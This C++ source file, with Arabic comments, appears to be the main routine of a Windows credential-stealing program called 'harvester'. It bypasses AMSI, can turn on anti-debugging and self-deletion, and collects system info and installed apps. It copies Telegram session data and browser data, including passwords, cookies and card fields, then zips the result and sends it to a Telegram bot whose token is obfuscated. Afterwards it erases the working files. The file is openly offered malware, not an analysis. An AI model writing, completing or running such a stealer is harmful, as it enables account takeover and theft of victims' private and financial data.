// main.cpp – نسخة تصحيح مع كتابة سجل
// ملاحظة: يمكن تجاوز هذه القيم من compiler flags مثل -DUSE_ANTI_DEBUG=1
#ifndef USE_ANTI_DEBUG
#define USE_ANTI_DEBUG 0   // نعطل anti-debug مؤقتاً للاختبار
#endif
#ifndef USE_AMSI_BYPASS
#define USE_AMSI_BYPASS 1
#endif
#ifndef USE_SELF_DELETE
#define USE_SELF_DELETE 0  // نعطل الحذف الذاتي
#endif

#include <windows.h>
#include <string>
#include <fstream>
#include "harvester/evasion/anti_debug.h"
#include "harvester/evasion/amsi_bypass.h"
#include "harvester/evasion/self_delete.h"
#include "harvester/collectors/telegram_collector.h"
#include "harvester/collectors/browser_collector.h"
#include "harvester/collectors/app_detector.h"
#include "harvester/system/system_info.h"
#include "harvester/report/report_builder.h"
#include "harvester/utils/zip_utils.h"
#include "harvester/exfil/telegram_client.h"
#include "harvester/crypto/obfuscation.h"

static void LogToFile(const std::string& msg) {
    std::ofstream log("C:\\debug_harvester.txt", std::ios::app);
    if (log.is_open()) {
        log << msg << std::endl;
        log.close();
    }
}

static bool CreateDirectoryRecursive(const std::string& path) {
    if (CreateDirectoryA(path.c_str(), NULL)) return true;
    if (GetLastError() == ERROR_ALREADY_EXISTS) return true;
    if (GetLastError() == ERROR_PATH_NOT_FOUND) {
        size_t pos = path.find_last_of("\\/");
        if (pos != std::string::npos) {
            std::string parent = path.substr(0, pos);
            if (CreateDirectoryRecursive(parent)) {
                return CreateDirectoryA(path.c_str(), NULL) != 0;
            }
        }
    }
    return false;
}

static void RemoveDirectoryRecursive(const std::string& path) {
    std::string searchPath = path + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                std::string fullPath = path + "\\" + fd.cFileName;
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    RemoveDirectoryRecursive(fullPath);
                    RemoveDirectoryA(fullPath.c_str());
                } else {
                    DeleteFileA(fullPath.c_str());
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    RemoveDirectoryA(path.c_str());
}

int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    LogToFile("========== START ==========");
    
    std::string botToken = GetObfuscatedString(STR_BOT_TOKEN);
    std::string chatId = GetObfuscatedString(STR_CHAT_ID);
    LogToFile("Bot token retrieved, chat ID retrieved");

#if USE_ANTI_DEBUG
    AntiDebugLoop();
#endif

#if USE_AMSI_BYPASS
    BypassAMSI();
#endif

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string workDir = std::string(tempPath) + "tg_h_" + std::to_string(GetCurrentProcessId());
    CreateDirectoryRecursive(workDir);
    LogToFile("Work directory: " + workDir);

    // ========== 1. جمع معلومات النظام ==========
    LogToFile("Calling CollectSystemInfo...");
    SystemInfo sysInfo = CollectSystemInfo();
    LogToFile("CollectSystemInfo returned. IP: " + sysInfo.ipAddress);
    LogToFile("Saving system info to file...");
    SaveSystemInfoToFile(sysInfo, workDir);
    LogToFile("SaveSystemInfoToFile done.");

    // ========== 2. كشف التطبيقات ==========
    LogToFile("Calling DetectTargetedApps...");
    std::vector<DetectedApp> detectedApps = DetectTargetedApps();
    LogToFile("DetectTargetedApps returned " + std::to_string(detectedApps.size()) + " apps");
    SaveDetectedAppsToFile(detectedApps, workDir);
    LogToFile("SaveDetectedAppsToFile done.");

    // ========== 3. جمع بيانات المتصفحات والجلسات ==========
    std::string tdataPath = FindTelegramTdata();
    if (!tdataPath.empty()) {
        LogToFile("Found tdata, copying...");
        CopyTelegramSession(tdataPath, workDir);
        LogToFile("Telegram session copied.");
    } else {
        LogToFile("No tdata found.");
    }
    LogToFile("Collecting browsers data...");
    CollectBrowsersData(workDir);
    LogToFile("Browsers data collected.");

    // ========== 4. إحصائيات (مؤقتة) ==========
    CollectedStats stats;
    stats.passwordsCount = 0;
    stats.cookiesCount = 0;
    stats.historyCount = 0;
    stats.autofillsCount = 0;
    stats.creditCardsCount = 0;
    stats.grabbedFilesCount = 0;
    stats.domains.push_back("github.com");
    LogToFile("Stats prepared.");

    // ========== 5. بناء التقرير ==========
    LogToFile("Calling BuildReport...");
    BuildReport(sysInfo, detectedApps, stats, workDir);
    LogToFile("BuildReport done.");

    // ========== 6. ضغط ==========
    std::string zipPath = workDir + ".zip";
    LogToFile("Zipping folder: " + workDir);
    if (ZipFolder(workDir, zipPath)) {
        LogToFile("ZIP created successfully: " + zipPath);
    } else {
        LogToFile("ZIP creation FAILED.");
    }

    // ========== 7. إرسال ==========
    LogToFile("Sending to Telegram...");
    bool sent = SendToTelegram(zipPath, botToken, chatId);
    LogToFile("Send result: " + std::string(sent ? "SUCCESS" : "FAILED"));

    // ========== 8. تنظيف ==========
    RemoveDirectoryRecursive(workDir);
    DeleteFileA(zipPath.c_str());
    LogToFile("Cleaned up.");

    LogToFile("========== FINISHED ==========");
    return 0;
}